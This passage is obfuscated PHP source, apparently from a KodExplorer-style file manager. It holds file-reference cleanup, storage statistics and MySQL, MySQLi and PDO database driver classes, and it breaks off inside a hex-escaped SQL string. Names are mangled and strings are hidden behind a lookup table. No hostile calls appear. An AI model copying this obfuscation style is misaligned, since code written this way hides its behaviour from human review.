$ËÎ½ğ§ . $è·éòÚ[12]; if (!$öÖ°Ø¾[$ï»òËÌÂ]) { $öÖ°Ø¾[$ï»òËÌÂ] = 0; } $öÖ°Ø¾[$ï»òËÌÂ]++; } $Ò–£íÉŠ = array(); foreach ($öÖ°Ø¾ as $ËÎ½ğ§ => $¿²ƒ°ƒÇ) { $ï»òËÌÂ = $¿²ƒ°ƒÇ . $è·éòÚ[12]; if (!$Ò–£íÉŠ[$ï»òËÌÂ]) { $Ò–£íÉŠ[$ï»òËÌÂ] = array(); } $Ò–£íÉŠ[$ï»òËÌÂ][] = $ËÎ½ğ§; } foreach ($Ò–£íÉŠ as $¿²ƒ°ƒÇ => $Á¨¯üıø) { if (!$Á¨¯üıø) { continue; } $¿²ƒ°ƒÇ = $¯¨µëå‘ ? $¿²ƒ°ƒÇ : -intval($¿²ƒ°ƒÇ); $½…åìıÙ = array($è·éòÚ[550] => array($è·éòÚ[7], $Á¨¯üıø)); if ($¿²ƒ°ƒÇ < 0) { $½…åìıÙ[$è·éòÚ[2022]] = array($è·éòÚ[1076], abs($¿²ƒ°ƒÇ)); } $this->where($½…åìıÙ)->setAdd($è·éòÚ[2022], $¿²ƒ°ƒÇ); } } public function findByHash($„‹¤Ç”›, $ä¾ûö¤¯ = false) { $„‹Í¬ï‡ =& $_SERVER[£ğ°ÖØø]; if (!$„‹¤Ç”› && !$ä¾ûö¤¯) { return !1; } $™÷æ·Å = array($„‹Í¬ï‡[2016] => $„‹¤Ç”›); if ($ä¾ûö¤¯) { $™÷æ·Å = array($„‹Í¬ï‡[2017] => $ä¾ûö¤¯); } return $this->order($„‹Í¬ï‡[2023])->where($™÷æ·Å)->find(); } public function clearEmpty($Òââñêâ = 0) { $·´ÉéãÕ =& $_SERVER[£ğ°ÖØø]; $©Ú‹™× = time() - 3600 * 24 * $Òââñêâ; $÷Ôïçê€ = $·´ÉéãÕ[2024] . $©Ú‹™×; $©´¾€ò„ = $this->where($÷Ôïçê€)->select(); if (!$©´¾€ò„) { return; } $®ÁíÚªÓ = new Task($·´ÉéãÕ[2025], $·´ÉéãÕ[12], count($©´¾€ò„)); foreach ($©´¾€ò„ as $°¬·¹µ¥) { $®ÁíÚªÓ->update(1); $this->resetFile($°¬·¹µ¥); } $®ÁíÚªÓ->end(); } public function resetFile($ÈÒû–¥°) { $±ÊÒÀöª =& $_SERVER[£ğ°ÖØø]; $´ˆÄà«° = array($±ÊÒÀöª[551] => $ÈÒû–¥°[$±ÊÒÀöª[550]]); $ÍïóÏÇ‡ = Model($±ÊÒÀöª[1401])->where($´ˆÄà«°)->count(); $ÑïÌœéç = Model($±ÊÒÀöª[2026])->where($´ˆÄà«°)->count(); $¸¼Œ‰ô = intval($ÍïóÏÇ‡) + intval($ÑïÌœéç); if ($¸¼Œ‰ô == 0) { IO::remove($ÈÒû–¥°[$±ÊÒÀöª[87]]); Model($±ÊÒÀöª[2027])->delete($ÈÒû–¥°[$±ÊÒÀöª[550]]); $this->where($´ˆÄà«°)->delete(); $this->metaSet($ÈÒû–¥°[$±ÊÒÀöª[550]], null, null); write_log(ACTION . $±ÊÒÀöª[2028] . KodUser::id() . $±ÊÒÀöª[2029] . $ÈÒû–¥°[$±ÊÒÀöª[550]] . $±ÊÒÀöª[2030] . $ÈÒû–¥°[$±ÊÒÀöª[79]] . $±ÊÒÀöª[201] . $ÈÒû–¥°[$±ÊÒÀöª[87]], $±ÊÒÀöª[2031]); return; } if ($ÈÒû–¥°[$±ÊÒÀöª[2022]] != $¸¼Œ‰ô) { $this->where($´ˆÄà«°)->save(array($±ÊÒÀöª[2015] => $¸¼Œ‰ô)); } } public function storageInfo($¨“¨İ¶  = false) { $«ÀÇ³İ =& $_SERVER[£ğ°ÖØø]; $¶Íñ²¢î = $this->count() + 0.0; $ñï€ß– = 0; $«·¾Úó¥ = 1; $‹ÊÕ÷ = 0; $üğ™È¾â = 5000; for ($˜€ƒ¥¿å = 0; $˜€ƒ¥¿å < $¶Íñ²¢î; $˜€ƒ¥¿å = $˜€ƒ¥¿å + $üğ™È¾â) { $Ÿ½‹œÓ­ = $this->limit($˜€ƒ¥¿å, $˜€ƒ¥¿å + $üğ™È¾â)->select(); foreach ($Ÿ½‹œÓ­ as $ÅòÌ •‹) { $«·¾Úó¥ += $ÅòÌ •‹[$«ÀÇ³İ[79]] * $ÅòÌ •‹[$«ÀÇ³İ[2022]]; $ñï€ß– += $ÅòÌ •‹[$«ÀÇ³İ[79]] * ($ÅòÌ •‹[$«ÀÇ³İ[2022]] - 1); $‹ÊÕ÷ += $ÅòÌ •‹[$«ÀÇ³İ[2022]]; } } $ ’ÔøË = array($«ÀÇ³İ[2032] => $«·¾Úó¥, $«ÀÇ³İ[2033] => $ñï€ß–, $«ÀÇ³İ[2034] => $ñï€ß– / $«·¾Úó¥, $«ÀÇ³İ[83] => $¶Íñ²¢î, $«ÀÇ³İ[2035] => $‹ÊÕ÷); return $ ’ÔøË; } } goto cè¼¡†Ç†ø; Fµ§Æí¼ˆÊ: class DbMysql extends Db { public function __construct($Ê¿ŒÀäÚ = '') { $îóİò· =& $_SERVER[£ğ°ÖØø]; if (!extension_loaded($îóİò·[868])) { think_exception(think_lang($îóİò·[14]) . $îóİò·[946]); } if (!empty($Ê¿ŒÀäÚ)) { $this->config = $Ê¿ŒÀäÚ; if (empty($this->config[$îóİò·[17]])) { $this->config[$îóİò·[17]] = $îóİò·[12]; } } } public function connect($¿İ’¹ÍÔ = '', $ĞŞÙ¤—ì = 0, $÷Ê»›ÀÂ = false) { $¥£ÏëÅœ =& $_SERVER[£ğ°ÖØø]; if (!isset($this->linkID[$ĞŞÙ¤—ì])) { if (empty($¿İ’¹ÍÔ)) { $¿İ’¹ÍÔ = $this->config; } $óì”Ïî÷ = $¿İ’¹ÍÔ[$¥£ÏëÅœ[947]] . ($¿İ’¹ÍÔ[$¥£ÏëÅœ[948]] ? "\x3a{$¿İ’¹ÍÔ[$¥£ÏëÅœ[948]]}" : $¥£ÏëÅœ[12]); $çè¢°¯Õ = !empty($¿İ’¹ÍÔ[$¥£ÏëÅœ[17]][$¥£ÏëÅœ[18]]) ? $¿İ’¹ÍÔ[$¥£ÏëÅœ[17]][$¥£ÏëÅœ[18]] : $this->pconnect; if ($çè¢°¯Õ) { $this->linkID[$ĞŞÙ¤—ì] = mysql_pconnect($óì”Ïî÷, $¿İ’¹ÍÔ[$¥£ÏëÅœ[949]], $¿İ’¹ÍÔ[$¥£ÏëÅœ[950]], 131072); } else { $this->linkID[$ĞŞÙ¤—ì] = mysql_connect($óì”Ïî÷, $¿İ’¹ÍÔ[$¥£ÏëÅœ[949]], $¿İ’¹ÍÔ[$¥£ÏëÅœ[950]], !0, 131072); } if (!$this->linkID[$ĞŞÙ¤—ì] || !empty($¿İ’¹ÍÔ[$¥£ÏëÅœ[21]]) && !mysql_select_db($¿İ’¹ÍÔ[$¥£ÏëÅœ[21]], $this->linkID[$ĞŞÙ¤—ì])) { think_exception(mysql_error()); } $ú½ÚïìÕ = mysql_get_server_info($this->linkID[$ĞŞÙ¤—ì]); mysql_query($¥£ÏëÅœ[951] . think_config($¥£ÏëÅœ[952]) . $¥£ÏëÅœ[58], $this->linkID[$ĞŞÙ¤—ì]); if ($ú½ÚïìÕ > $¥£ÏëÅœ[953]) { mysql_query($¥£ÏëÅœ[954], $this->linkID[$ĞŞÙ¤—ì]); } $this->connected = !0; if (1 != think_config($¥£ÏëÅœ[22])) { unset($this->config); } } return $this->linkID[$ĞŞÙ¤—ì]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ı“¢Ğê¥) { $£êñ·Â¿ =& $_SERVER[£ğ°ÖØø]; if (0 === stripos($ı“¢Ğê¥, $£êñ·Â¿[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ı“¢Ğê¥; if ($this->queryID) { $this->free(); } think_action_status($£êñ·Â¿[23], 1); think_status($£êñ·Â¿[24]); $this->queryID = mysql_query($ı“¢Ğê¥, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ûª£¬Ë×) { $ÉÙéö¸³ =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ûª£¬Ë×; if ($this->queryID) { $this->free(); } think_action_status($ÉÙéö¸³[25], 1); think_status($ÉÙéö¸³[24]); $®³÷Î‘· = mysql_query($ûª£¬Ë×, $this->_linkID); $this->debug(); if (!1 === $®³÷Î‘·) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[£ğ°ÖØø][955], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¶¡±Ñ×‹ = mysql_query($_SERVER[£ğ°ÖØø][956], $this->_linkID); $this->transTimes = 0; if (!$¶¡±Ñ×‹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $­ØÛÑæ = mysql_query($_SERVER[£ğ°ÖØø][957], $this->_linkID); $this->transTimes = 0; if (!$­ØÛÑæ) { $this->error(); return !1; } } return !0; } private function getAll() { $…Ò’öç = array(); if ($this->numRows > 0) { while ($Ã¢ôÍ·ö = mysql_fetch_assoc($this->queryID)) { $…Ò’öç[] = $Ã¢ôÍ·ö; } mysql_data_seek($this->queryID, 0); } return $…Ò’öç; } public function getFields($¶ÊéôƒŒ) { $ßöÖÌà =& $_SERVER[£ğ°ÖØø]; $âÜ…«İÆ = $this->query($ßöÖÌà[958] . $this->parseKey($¶ÊéôƒŒ)); $óªÍ © = array(); if ($âÜ…«İÆ) { foreach ($âÜ…«İÆ as $ı’îãÀë => $ÉğªŠñ·) { $óªÍ ©[$ÉğªŠñ·[$ßöÖÌà[31]]] = array($ßöÖÌà[32] => $ÉğªŠñ·[$ßöÖÌà[31]], $ßöÖÌà[33] => $ÉğªŠñ·[$ßöÖÌà[34]], $ßöÖÌà[35] => (bool) (strtoupper($ÉğªŠñ·[$ßöÖÌà[36]]) === $ßöÖÌà[959]), $ßöÖÌà[37] => $ÉğªŠñ·[$ßöÖÌà[38]], $ßöÖÌà[39] => strtolower($ÉğªŠñ·[$ßöÖÌà[40]]) == $ßöÖÌà[41], $ßöÖÌà[42] => strtolower($ÉğªŠñ·[$ßöÖÌà[43]]) == $ßöÖÌà[44]); } } return $óªÍ ©; } public function getTables($î©“îÃå = '') { $’••Ãì¢ =& $_SERVER[£ğ°ÖØø]; if (!empty($î©“îÃå)) { $¢øñ¦ó = $’••Ãì¢[960] . $î©“îÃå . $’••Ãì¢[961]; } else { $¢øñ¦ó = $’••Ãì¢[962]; } $‘¥ì¨ãâ = $this->query($¢øñ¦ó); $“‚±ØÄ™ = array(); foreach ($‘¥ì¨ãâ as $£Â‰îëè => $Ù°‹¡şç) { $“‚±ØÄ™[$£Â‰îëè] = current($Ù°‹¡şç); } return $“‚±ØÄ™; } public function replace($ñîû¿, $ˆÄ••¬Š = array()) { $›»Éœ’½ =& $_SERVER[£ğ°ÖØø]; foreach ($ñîû¿ as $“Ğı°°© => $—ùàÔ ü) { $½ıŠˆÆ = $this->parseValue($—ùàÔ ü); if (is_scalar($½ıŠˆÆ)) { $¦£‚Ä‘ı[] = $½ıŠˆÆ; $™¹¸áë[] = $this->parseKey($“Ğı°°©); } } $÷Ì‚È¯Ú = $›»Éœ’½[963] . $this->parseTable($ˆÄ••¬Š[$›»Éœ’½[356]]) . $›»Éœ’½[964] . implode($›»Éœ’½[50], $™¹¸áë) . $›»Éœ’½[965] . implode($›»Éœ’½[50], $¦£‚Ä‘ı) . $›»Éœ’½[966]; return $this->execute($÷Ì‚È¯Ú); } public function insertAll($§¾Ä“, $ËÌúÙ× = array(), $õ“¨´×… = false) { $”€Î¿¯¨ =& $_SERVER[£ğ°ÖØø]; if (!is_array($§¾Ä“[0])) { return !1; } $ØÑ´¨ìè = array_keys($§¾Ä“[0]); $ÄÆÛ†Âè = array(); foreach ($§¾Ä“ as $ì¶ üÎ¦) { $Ô‡½å”› = array(); foreach ($ì¶ üÎ¦ as $Ğ©†Ôª => $’€Ï‹¦ƒ) { $’€Ï‹¦ƒ = $this->parseValue($’€Ï‹¦ƒ); if (is_scalar($’€Ï‹¦ƒ)) { $Ô‡½å”›[] = $’€Ï‹¦ƒ; } } $ÄÆÛ†Âè[] = $”€Î¿¯¨[337] . implode($”€Î¿¯¨[50], $Ô‡½å”›) . $”€Î¿¯¨[966]; } array_walk($ØÑ´¨ìè, array($this, $”€Î¿¯¨[967])); $¿ü—é™” = ($õ“¨´×… ? $”€Î¿¯¨[968] : $”€Î¿¯¨[969]) . $”€Î¿¯¨[970] . $this->parseTable($ËÌúÙ×[$”€Î¿¯¨[356]]) . $”€Î¿¯¨[964] . implode($”€Î¿¯¨[50], $ØÑ´¨ìè) . $”€Î¿¯¨[971] . implode($”€Î¿¯¨[50], $ÄÆÛ†Âè); return $this->execute($¿ü—é™”); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÅÔªºÜµ =& $_SERVER[£ğ°ÖØø]; $this->error = mysql_errno() . $ÅÔªºÜµ[4] . mysql_error($this->_linkID); if ($ÅÔªºÜµ[12] != $this->queryStr) { $this->error .= LNG($ÅÔªºÜµ[48]) . $this->queryStr; } think_trace($this->error, $ÅÔªºÜµ[12], $ÅÔªºÜµ[49]); return $this->error; } public function escapeString($šöøôğñ) { if ($this->_linkID) { return mysql_real_escape_string($šöøôğñ, $this->_linkID); } else { return mysql_escape_string($šöøôğñ); } } public function parseKey(&$óÍ”ôÉÃ, $¶¥ÉçÌş = true) { $ªÊ²ë¾— =& $_SERVER[£ğ°ÖØø]; if ($¶¥ÉçÌş) { $óÍ”ôÉÃ = $this->parseKeyCheck($óÍ”ôÉÃ); } if ($óÍ”ôÉÃ != $ªÊ²ë¾—[220] && !preg_match($ªÊ²ë¾—[972], $óÍ”ôÉÃ)) { $óÍ”ôÉÃ = $ªÊ²ë¾—[470] . trim($óÍ”ôÉÃ, $ªÊ²ë¾—[470]) . $ªÊ²ë¾—[470]; } return $óÍ”ôÉÃ; } } class DbMysqli extends Db { public function __construct($¹±ª‘Óş = '') { $äÓ—ØûÅ =& $_SERVER[£ğ°ÖØø]; if (!extension_loaded($äÓ—ØûÅ[973])) { think_exception(think_lang($äÓ—ØûÅ[14]) . $äÓ—ØûÅ[974]); } if (!empty($¹±ª‘Óş)) { $this->config = $¹±ª‘Óş; if (empty($this->config[$äÓ—ØûÅ[17]])) { $this->config[$äÓ—ØûÅ[17]] = $äÓ—ØûÅ[12]; } } } public function connect($·…ø¤²‹ = '', $«Œğà“á = 0) { $åÍ³¹¡Ş =& $_SERVER[£ğ°ÖØø]; if (!isset($this->linkID[$«Œğà“á])) { if (empty($·…ø¤²‹)) { $·…ø¤²‹ = $this->config; } $this->linkID[$«Œğà“á] = new mysqli($·…ø¤²‹[$åÍ³¹¡Ş[947]], $·…ø¤²‹[$åÍ³¹¡Ş[949]], $·…ø¤²‹[$åÍ³¹¡Ş[950]], $·…ø¤²‹[$åÍ³¹¡Ş[21]], $·…ø¤²‹[$åÍ³¹¡Ş[948]] ? intval($·…ø¤²‹[$åÍ³¹¡Ş[948]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ò–ËÜø = $this->linkID[$«Œğà“á]->server_version; $this->linkID[$«Œğà“á]->query($åÍ³¹¡Ş[951] . think_config($åÍ³¹¡Ş[952]) . $åÍ³¹¡Ş[58]); if ($ò–ËÜø > $åÍ³¹¡Ş[953]) { $this->linkID[$«Œğà“á]->query($åÍ³¹¡Ş[954]); } $this->connected = !0; if (1 != think_config($åÍ³¹¡Ş[22])) { unset($this->config); } } return $this->linkID[$«Œğà“á]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($øŞĞÀù¦) { $šÙ†æ‚£ =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $øŞĞÀù¦; if ($this->queryID) { $this->free(); } think_action_status($šÙ†æ‚£[23], 1); think_status($šÙ†æ‚£[24]); $this->queryID = $this->_linkID->query($øŞĞÀù¦); if ($this->_linkID->more_results()) { while (($ô‰¼õ = $this->_linkID->next_result()) != NULL) { $ô‰¼õ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($şÇÈàÃ¾) { $éÆ¸øåÍ =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $şÇÈàÃ¾; if ($this->queryID) { $this->free(); } think_action_status($éÆ¸øåÍ[25], 1); think_status($éÆ¸øåÍ[24]); $¾¸ë« = $this->_linkID->query($şÇÈàÃ¾); $this->debug(); if (!1 === $¾¸ë«) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ãÜÜ¾šö = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ãÜÜ¾šö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ü¥œõû¨ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ü¥œõû¨) { $this->error(); return !1; } } return !0; } private function getAll() { $³·âê‹¶ = array(); if ($this->numRows > 0) { for ($Ç‘ÛéÑ¢ = 0; $Ç‘ÛéÑ¢ < $this->numRows; $Ç‘ÛéÑ¢++) { $³·âê‹¶[$Ç‘ÛéÑ¢] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $³·âê‹¶; } public function getFields($ÎÑ®é·) { $œ®´·µÅ =& $_SERVER[£ğ°ÖØø]; $÷ëœ¦Úª = $this->query($œ®´·µÅ[958] . $this->parseKey($ÎÑ®é·)); $´¸Éâ‰‘ = array(); if ($÷ëœ¦Úª) { foreach ($÷ëœ¦Úª as $ıÜÑ— => $ÎÙàÆ…) { $´¸Éâ‰‘[$ÎÙàÆ…[$œ®´·µÅ[31]]] = array($œ®´·µÅ[32] => $ÎÙàÆ…[$œ®´·µÅ[31]], $œ®´·µÅ[33] => $ÎÙàÆ…[$œ®´·µÅ[34]], $œ®´·µÅ[35] => (bool) ($ÎÙàÆ…[$œ®´·µÅ[36]] === $œ®´·µÅ[12]), $œ®´·µÅ[37] => $ÎÙàÆ…[$œ®´·µÅ[38]], $œ®´·µÅ[39] => strtolower($ÎÙàÆ…[$œ®´·µÅ[40]]) == $œ®´·µÅ[41], $œ®´·µÅ[42] => strtolower($ÎÙàÆ…[$œ®´·µÅ[43]]) == $œ®´·µÅ[44]); } } return $´¸Éâ‰‘; } public function getTables($¬ƒïßĞ¤ = '') { $ÎÁƒŸ…é =& $_SERVER[£ğ°ÖØø]; $ã¯×§ = !empty($¬ƒïßĞ¤) ? $ÎÁƒŸ…é[960] . $¬ƒïßĞ¤ . $ÎÁƒŸ…é[961] : $ÎÁƒŸ…é[962]; $ÚóÛª = $this->query($ã¯×§); $è”óÓòô = array(); if ($ÚóÛª) { foreach ($ÚóÛª as $°ÒŠ§œ => $’á¤Ô¦) { $è”óÓòô[$°ÒŠ§œ] = current($’á¤Ô¦); } } return $è”óÓòô; } public function replace($ùã¡ÁÕ¯, $¸¥µ§‡ = array()) { $ä‹Åö—õ =& $_SERVER[£ğ°ÖØø]; foreach ($ùã¡ÁÕ¯ as $ÓèĞÃõ÷ => $À©†œÎ) { $ˆùä£óß = $this->parseValue($À©†œÎ); if (is_scalar($ˆùä£óß)) { $ûúª·[] = $ˆùä£óß; $ñÜÎŒ[] = $this->parseKey($ÓèĞÃõ÷); } } $ËŸšÏÈ³ = $ä‹Åö—õ[963] . $this->parseTable($¸¥µ§‡[$ä‹Åö—õ[356]]) . $ä‹Åö—õ[964] . implode($ä‹Åö—õ[50], $ñÜÎŒ) . $ä‹Åö—õ[965] . implode($ä‹Åö—õ[50], $ûúª·) . $ä‹Åö—õ[966]; return $this->execute($ËŸšÏÈ³); } public function insertAll($®Ô¡Š–, $Õ¯¯¦ñã = array(), $ğÏÆ¶í = false) { $Åİ¤Å¼Ÿ =& $_SERVER[£ğ°ÖØø]; if (!is_array($®Ô¡Š–[0])) { return !1; } $ŞÌˆÀÒ• = array_keys($®Ô¡Š–[0]); $ï¼ÊÑıˆ = array(); foreach ($®Ô¡Š– as $âÇÌ»Ô†) { $èÈŞŒ£Æ = array(); foreach ($âÇÌ»Ô† as $Ëó»ó‘ => $ß„ßŸğê) { $ß„ßŸğê = $this->parseValue($ß„ßŸğê); if (is_scalar($ß„ßŸğê)) { $èÈŞŒ£Æ[] = $ß„ßŸğê; } } $ï¼ÊÑıˆ[] = $Åİ¤Å¼Ÿ[337] . implode($Åİ¤Å¼Ÿ[50], $èÈŞŒ£Æ) . $Åİ¤Å¼Ÿ[966]; } array_walk($ŞÌˆÀÒ•, array($this, $Åİ¤Å¼Ÿ[967])); $ê§ƒÇé³ = $ğÏÆ¶í ? $Åİ¤Å¼Ÿ[968] : $Åİ¤Å¼Ÿ[969]; $íìÙò¬ò = $ê§ƒÇé³ . $Åİ¤Å¼Ÿ[970] . $this->parseTable($Õ¯¯¦ñã[$Åİ¤Å¼Ÿ[356]]) . $Åİ¤Å¼Ÿ[964] . implode($Åİ¤Å¼Ÿ[50], $ŞÌˆÀÒ•) . $Åİ¤Å¼Ÿ[971] . implode($Åİ¤Å¼Ÿ[50], $ï¼ÊÑıˆ); return $this->execute($íìÙò¬ò); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¢ŒéËĞ =& $_SERVER[£ğ°ÖØø]; $this->error = $this->_linkID->errno . $¢ŒéËĞ[4] . $this->_linkID->error; if ($¢ŒéËĞ[12] != $this->queryStr) { $this->error .= LNG($¢ŒéËĞ[48]) . $this->queryStr; } think_trace($this->error, $¢ŒéËĞ[12], $¢ŒéËĞ[49]); return $this->error; } public function escapeString($ÏÀšËçâ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÏÀšËçâ); } else { return addslashes($ÏÀšËçâ); } } public function parseKey(&$Ñ·í«¼í, $É€«âì­ = true) { $İ§ƒ¯¤« =& $_SERVER[£ğ°ÖØø]; if ($É€«âì­) { $Ñ·í«¼í = $this->parseKeyCheck($Ñ·í«¼í); } if ($Ñ·í«¼í != $İ§ƒ¯¤«[220] && !preg_match($İ§ƒ¯¤«[972], $Ñ·í«¼í)) { $Ñ·í«¼í = $İ§ƒ¯¤«[470] . trim($Ñ·í«¼í, $İ§ƒ¯¤«[470]) . $İ§ƒ¯¤«[470]; } return $Ñ·í«¼í; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($å¶’ûš = '') { $¦²ÌÌ‘Ø =& $_SERVER[£ğ°ÖØø]; if (!class_exists($¦²ÌÌ‘Ø[975])) { think_exception(think_lang($¦²ÌÌ‘Ø[14]) . $¦²ÌÌ‘Ø[976]); } if (!empty($å¶’ûš)) { $this->config = $å¶’ûš; if (empty($this->config[$¦²ÌÌ‘Ø[17]])) { $this->config[$¦²ÌÌ‘Ø[17]] = array(); } } } public function connect($±Öá—•é = '', $Œ†Üáı = 0) { $¿ãçíï =& $_SERVER[£ğ°ÖØø]; if (!isset($this->linkID[$Œ†Üáı])) { if (empty($±Öá—•é)) { $±Öá—•é = $this->config; } $°âß„¦û = !empty($±Öá—•é[$¿ãçíï[17]][$¿ãçíï[18]]) ? $±Öá—•é[$¿ãçíï[17]][$¿ãçíï[18]] : $this->pconnect; if ($°âß„¦û) { $±Öá—•é[$¿ãçíï[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Œ†Üáı] = new PDO($±Öá—•é[$¿ãçíï[977]], $±Öá—•é[$¿ãçíï[949]], $±Öá—•é[$¿ãçíï[950]], $±Öá—•é[$¿ãçíï[17]]); } catch (PDOException $§ËŸ•×ß) { think_exception($§ËŸ•×ß->getMessage()); } $this->dbType = $this->_getDsnType($±Öá—•é[$¿ãçíï[977]]); if (in_array($this->dbType, array($¿ãçíï[978], $¿ãçíï[979], $¿ãçíï[980], $¿ãçíï[981]))) { think_exception($¿ãçíï[982] . $this->dbType . $¿ãçíï[983] . $this->dbType . $¿ãçíï[984]); } if (!$this->linkID[$Œ†Üáı]) { think_exception($¿ãçíï[985]); } try { $this->linkID[$Œ†Üáı]->exec($¿ãçíï[986] . think_config($¿ãçíï[952])); } catch (Exception $§ËŸ•×ß) { } $this->connected = !0; if (1 != think_config($¿ãçíï[22])) { unset($this->config); } } return $this->linkID[$Œ†Üáı]; } public function free() { $this->PDOStatement = null; } public function query($Í«¥ûŞë, $åÃ÷Ñ = array()) { $¾ˆœÇÔ =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Í«¥ûŞë; if (!empty($åÃ÷Ñ)) { $this->queryStr .= $¾ˆœÇÔ[987] . print_r($åÃ÷Ñ, !0) . $¾ˆœÇÔ[988]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¾ˆœÇÔ[23], 1); think_status($¾ˆœÇÔ[24]); $this->PDOStatement = $this->_linkID->prepare($Í«¥ûŞë); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $õÂº«©ü = $this->PDOStatement->execute($åÃ÷Ñ); $this->debug(); if (!1 === $õÂº«©ü) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ï¡î±½ı, $âÂóæ×§ = array()) { $˜Â–ä˜Š =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ï¡î±½ı; if (!empty($âÂóæ×§)) { $this->queryStr .= $˜Â–ä˜Š[987] . print_r($âÂóæ×§, !0) . $˜Â–ä˜Š[988]; } $Şè×„¡ = !1; if ($this->dbType == $˜Â–ä˜Š[981]) { if (preg_match($˜Â–ä˜Š[989], $this->queryStr, $„ìØ î)) { $this->table = think_config($˜Â–ä˜Š[990]) . str_ireplace(think_config($˜Â–ä˜Š[991]), $˜Â–ä˜Š[463], $„ìØ î[2]); $Şè×„¡ = (bool) $this->query($˜Â–ä˜Š[992] . strtoupper($this->table) . $˜Â–ä˜Š[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($˜Â–ä˜Š[25], 1); think_status($˜Â–ä˜Š[24]); $this->PDOStatement = $this->_linkID->prepare($ï¡î±½ı); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ØÀÓºŒï = $this->PDOStatement->execute($âÂóæ×§); $this->debug(); if (!1 === $ØÀÓºŒï) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Şè×„¡ || preg_match($˜Â–ä˜Š[993], $ï¡î±½ı)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ê”¿úß = $this->_linkID->commit(); $this->transTimes = 0; if (!$ê”¿úß) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $î ·—¯Ğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$î ·—¯Ğ) { $this->error(); return !1; } } return !0; } private function getAll() { $«¬îËë± = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($«¬îËë±); return $«¬îËë±; } public function getFields($˜—§•ã©) { $ù¬ÕÁğ” =& $_SERVER[£ğ°ÖØø]; $this->initConnect(!0); if (think_config($ù¬ÕÁğ”[994])) { $’¼ëÁŞñ = str_replace($ù¬ÕÁğ”[995], $˜—§•ã©, think_config($ù¬ÕÁğ”[994])); } else { switch ($this->dbType) { case $ù¬ÕÁğ”[978]: case $ù¬ÕÁğ”[996]: $’¼ëÁŞñ = "\123\x45\114\x45\x43\x54\40\40\x20\143\157\154\x75\x6d\156\x5f\156\141\155\145\40\141\x73\40\47\116\141\x6d\x65\47\x2c\x20\x20\x20\144\141\164\x61\137\164\171\160\x65\40\x61\163\x20\x27\x54\x79\160\x65\x27\x2c\40\40\x20\x63\157\154\165\x6d\x6e\x5f\144\x65\146\x61\x75\154\164\x20\141\x73\40\x27\x44\145\146\x61\x75\154\x74\x27\54\x20\x20\x20\x69\163\x5f\156\x75\154\154\141\142\154\x65\x20\141\163\x20\x27\x4e\x75\154\x6c\47\12\11\x9\106\x52\117\115\11\151\156\146\x6f\162\155\141\164\151\x6f\156\x5f\x73\143\x68\145\155\x61\x2e\x74\x61\x62\154\145\x73\x20\x41\123\x20\164\xa\11\11\112\117\111\116\11\x69\x6e\146\157\162\x6d\x61\164\x69\157\156\x5f\x73\x63\150\145\155\x61\x2e\143\x6f\x6c\x75\155\x6e\x73\40\101\123\40\143\12\x9\x9\117\116\40\40\x74\x2e\x74\x61\x62\154\145\x5f\x63\x61\x74\141\x6c\x6f\147\x20\75\x20\143\56\x74\x61\x62\154\145\x5f\143\141\164\x61\154\x6f\147\xa\x9\11\x41\116\104\40\164\56\x74\x61\142\x6c\x65\137\163\x63\150\145\x6d\x61\x20\x3d\40\143\56\x74\x61\142\154\145\x5f